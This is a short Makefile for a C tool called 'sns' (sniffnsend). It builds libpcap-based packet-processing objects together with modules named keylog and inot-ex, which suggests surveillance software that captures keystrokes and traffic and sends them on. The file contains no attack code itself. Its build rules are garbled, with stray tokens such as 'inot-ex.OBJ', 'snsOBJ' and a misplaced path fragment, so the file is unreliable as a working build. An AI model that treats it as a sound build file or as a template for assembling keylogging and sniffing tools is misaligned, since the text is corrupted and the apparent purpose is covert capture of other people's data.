# Makefile for sns
CC=gcc -g
CLIB=-lpcap
LIB=../shared
BIN=../../bin
SVR=`pwd`

default: sniffnsend

sniffnsend: LIB
	$(CC) -o $(BIN)/sns $(LIB)/sniffnsend.o \
	$(LIB)/proc_ether.o $(LIB)/proc_hdrs.o $(LIB)/proc_payload.o \
	$(LIB)/inot-ex.o $(LIB)/keylog.o

LIB:
		$(CC) -c $(LIB)/proc_ether.c && \
		$(CC) -c $(LIB)/proc_hdrs.c && \
		$(CC) -c $(LIB)/proc_payload.c && \
		$(CC) -c $(LIB)/inot-ex.OBJ&& \
		$(CC) -c $(LIB)/keylog.c && $(LIB)/\
		$(CC) -c $(SVR)/sniffnsend.c

clean:
	rm -f *.o $(LIB)/*.o core snsOBJ

sniffnsend.o: sniffnsend.c
		$(CC) -c sniffnsend.c

proc_ether.o: proc_ether.c
	$(CC) -c $(LIB)/proc_ether.c

proc_hdrs.o: proc_hdrs.c
	$(CC) -c $(LIB)/proc_hdrs.c

proc_payload.o: proc_payload.c
	$(CC) -c $(LIB)/proc_payload.c

keylog.o:  keylog.c
	$(CC) -c  $(LIB)/keylog.c

inot-ex.o: inot-ex.c
	$(CC) -c $(LIB)/inot-ex.c
